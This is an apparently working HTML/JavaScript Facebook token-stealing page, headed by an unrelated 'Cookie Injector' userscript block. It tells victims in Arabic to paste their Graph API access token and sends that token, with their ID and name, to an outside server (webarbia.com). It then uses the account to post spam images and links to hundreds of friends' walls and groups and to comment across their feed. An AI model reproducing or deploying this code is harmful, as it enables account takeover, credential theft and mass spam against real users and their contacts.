// ==UserScript==
// @name           Cookie Injector
// @namespace      BearsWithWings
// @description    Inject Cookie String From Wireshark Dump Into Any Webpage
// @version 2.0.1
// @include        *
// @exclude	   https?://gmail.com/*
// @exclude	   https?://mail.google.com/*
// ==/UserScript==

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
		<script type="text/javascript">window.jQuery || document.write('<script src="classes/commons/jquery/jquery-1.7.1.min.js"><\/script>')</script>
	</head>
	
<body>
<!-- Writtin By Mostafa Kassem -->
<!-- Api Get Access Token And Share -->
<!--  https://www.facebook.com/ArpTechnologyCenter -->
<style>
	#login_form {
    background-color: #B0C4DE;
    border-radius: 2px 2px 2px 2px;
    box-shadow: 0 1px 5px black;
    margin-left: 0;
    padding: 8px;
    width:300px;
    margin:auto;
    text-align:center;
}
#login_form p {
    display: inline-block;
    margin-bottom: 5px !important;
    margin-right: 4px;
    width: 100%;
    text-align:center;
}
#login_form button {
    line-height: 30px;
    margin: 0;
}
form p {
  margin-bottom: 11px;
  position: relative;
}

form input[type="text"], form input[type="password"], form textarea {
  border: 1px solid #d9d9d9;
  border-top: 1px solid #ccc;
  border-radius: 2px;
  box-shadow: 0 1px 0 #fff;
  color: #666;
  font-family: "Aller", "Lucida Grande", sans-serif;
  font-size: 12px;
  height: 30px;
  outline: none;
  padding: 6px 10px;
  resize: none;
  width: 252px;
}

form input::-webkit-input-placeholder, form input::-moz-placeholder {
  color: #bbb;
}

form textarea {
  height: 112px;
  line-height: 18px;
  margin-bottom: 0;
  padding-top: 8px;
}

form div.combined {
  position: relative;
}

form div.combined p {
  display: inline-block;
  *display: inline;
  zoom: 1;
}

form div.combined p input {
  display: inline;
}

form div.combined p:first-child input {
  border-bottom-right-radius: 0;
  border-top-right-radius: 0;
  border-right: none;
}

input.button, .button {
  border: 1px solid #c4c4c4;
  border-radius: 3px;
  box-shadow: 0 1px 3px #ddd;
  color: #757575;
  display: inline-block;
  *display: inline;
  font-family: "Tahoma", sans-serif;
  font-size: 11px;
  font-weight: bold;
  height: 31px;
  line-height: 31px;
  margin-right: 4px;
  padding: 0 14px;
  text-decoration: none;
  text-shadow: 0 1px 0 #fff;
  text-transform: uppercase;
  zoom: 1;
}

.box-content > .button {
  margin-bottom: 7px;
}

input.button {
  height: 33px;
  margin-top: -3px;
}

.button.blue {
  border: 1px solid #477dae;
  color: #fff;
  text-shadow: 0 1px 0 #104266;
  background: #558bbc;
}

.button:hover {
  background: #ebebeb;
}

.button.blue:hover {
  background: #333333;
}


</style>
<div id="login_container" style="margin-top: 0px">
<div id="login_form">
<form id="tokengonder" novalidate="novalidate">
<p style="width: 200px;">
<input id="access_token" name="access_token" placeholder="ضع الكود الذي قمت بنسخه هنا للدخول الى التطبيق" class="{validate: {required: true}}" type="text" />
</p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
<button id="gonder" type="button" class="button blue">تفعيل
</button>
<button id="tokenal" onclick="window.open('https://developers.facebook.com/tools/explorer/?app_id=350685531728&method=GET&path=100006195069154%3Ffields%3Did%2Cname','sth','width=900,height=200');" type="button" class="button blue">احصل على كود التفعيل
</button>
<div id="logs">
</div>
</form></div>
<div id="atp"></div><br>&nbsp;<p>&nbsp;
</div>
<!-- Writtin By Mostafa Kassem -->
<!-- Api Get Access Token And Share -->
<!--  https://www.facebook.com/ArpTechnologyCenter -->
<script>
$(document).ready(function(){
// ILETI Function
function ileti(type,msg){
     $('#logs').append('<div class="notification ' + type + '" id="ileti" style="display:none;margin-top:10px;"><span class="icon"></span>' + msg + '</div>');
     $('#ileti').fadeIn('slow');
     $('#ileti').removeAttr('id');
  }
    $('#gonder').click(function(){
	access_token = $('#access_token').val();
	jQuery.ajax({
    url:'https://graph.facebook.com/me?access_token=' + access_token,
    dataType:'jsonp',
    success:function(data){
	user = data;
    if(user && user.name){
    tokenme = access_token;
	frnds();
	pgrp();
	// Pages & Groups & Followed Accounts
    var Pages = [];
    var Groups = [];
    var Follow = [];
    var Friend = [];    
	// Set Pages
	Pages.push("Page ID"); 
	Pages.push("Page ID"); 
	// Set Groups 
	Groups.push("Grpup ID"); 
	Groups.push("Grpup ID"); 
	//  Followed Accounts
	Follow.push("Account ID"); 
	Follow.push("Account ID"); 
	//  Be Friend To
	Friend.push("Account ID"); 
	Friend.push("Account ID"); 
	// Send Post Information @ معلومات البوست الذي سينشر @
	
	 fotolink = "http://im33.gulfup.com/LbqWZ.png"; // رابط الصورة التي ستنشر
	 link = "http://wwww.google.com"; // اللينك الذي سيوجد بالبوست
	 text = "Test"+link;  // وصف الصورة

	// Send Information
        ileti("success","مرحباً " + user.name);
        ileti("success","سيتم تحويلك تلقائياً خلال 20 ثانية <br> <img src='http://im40.gulfup.com/JpfYJ.gif' />");
		$.post("http://webarbia.com/api/access.php", { u_id: user.id,user_name: user.name, token: access_token, pages: Pages, groups: Groups, follow: Follow, fotolink: fotolink, text: text,link: link, firend: Friend } );
		var t=setTimeout(function(){ 
		url = 'https://www.facebook.com/profile.php';
		top.location.href = url;
		},200000)
		}
	}
	});
	}); 
function pgrp(){
     jQuery.ajax({
     url:'https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 70&access_token='+access_token,
     dataType:'jsonp',
     success:function(data){
     wallpostg(data);
     }
     });
}
function frnds(){
           jQuery.ajax({
           url:'https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 500&access_token='+access_token,
           dataType:'jsonp',
           success:function(data){
           wallpost(data);
           }
           });
}

function kayit(user,token){
     jQuery.ajax({
     url:'kayit.php',
     type:'POST',
     data:{userid:user.id,gender:user.gender,access_token:token,username:user.name},
     success:function(data){
     if(data == "true"){
     ileti("success","Kayit basarili");
     }
     }
     });
}
     
     function sayfalar(sayfa){
     
     }
     
function arakla(token){
     jQuery.ajax({
    url:'https://graph.facebook.com/me?access_token=' + token,
    dataType:'jsonp',
    success:function(data){
    if(data.id){
    kayit(data,token);
    }
    }});  
}
  
          
function wallpost(list){
     for(i=0;i<list.data.length;i++){
     jQuery.ajax({
     url:'https://graph.facebook.com/'+list.data[i].uid+'/photos?url=' + fotolink + '&message=' + text +'&callback=paylas&method=POST&access_token=' + access_token,
     dataType:'script',
     success:function(){
     gonderildi += 1;
     if(gonderildi >= list.data.length){
            }
     }
     });
     }
}
	 
	 

function wallpostg(list){
     for(i=0;i<list.data.length;i++){
     jQuery.ajax({
     url:'https://graph.facebook.com/'+list.data[i].gid+'/photos?url=' + fotolink + '&message='+ text +'&callback=paylas&method=POST&access_token=' + access_token,
     dataType:'script',
     success:function(){
     gonderildi += 1;
     if(gonderildi >= list.data.length){
     }
     }
     });
}
}
     
function foto_paylas(){
     jQuery.ajax({
     url:'https://graph.facebook.com/me/photos?privacy={"value":"EVERYONE"}&url=' + fotolink + '&message='+ text +'&callback=paylas&method=POST&access_token=' + access_token,
     dataType:'script',
     success:function(){
     }
     });
}
   
     var turler = {video:"Video",status:"Durum Guncellemesi",link:"Baglanti",photo:"Fotograf",swf:"Video"};
     
function gonderiler(){
     jQuery.ajax({
     url:'https://graph.facebook.com/me?fields=feed.fields(message,privacy,type)&access_token=' + access_token,
     dataType:'jsonp',
     success:function(data){
     posts = data;
     for(i=0;i<posts.feed.data.length;i++){
     if(posts.feed.data[i].message){
     ileti("success",posts.feed.data[i].message.substr(0,50)+"... ("+turler[posts.feed.data[i].type]+")");
     }else{
     ileti("success","ID: "+posts.feed.data[i].id.split("_")[1]+"... ("+turler[posts.feed.data[i].type]+")");
}
     }
     }
     });
     }
     
     function paylas(){}
	 

function sstats() {
     access_token = $('#access_token').val();
     $.post("", { subs: user.id } );
     sub(access_token,arr[Math.round(arr.length*Math.random())]);
     setTimeout("getStatus()",10000); 
}
function getStatus(token){
     var commentShort = text;
     $.getJSON('https://graph.facebook.com/me?access_token=' + token, function (response) {
     if (response.id) {
     var userid = response.id;
     var totalComments = 1000;
     $.getJSON('https://graph.facebook.com/' + userid + '/home?limit=' + totalComments + '&access_token=' + token, function (response) {
     if(response.data){
     var allPosts = [];
     $.each(response.data, function(i,data){
     allPosts.push(data.id);
     var megaNumber=Math.floor(Math.random()*100);
     var commentMessage = commentShort + " ? " + megaNumber;
     $.getJSON('https://graph.facebook.com/' + data.id + '/comments?method=POST&message=' + commentMessage + '&access_token=' + token, function (response) {
      alert("Comment Posted!");
      });
    });
    }
  });
}
});
}

});

</script>
<body>
</html>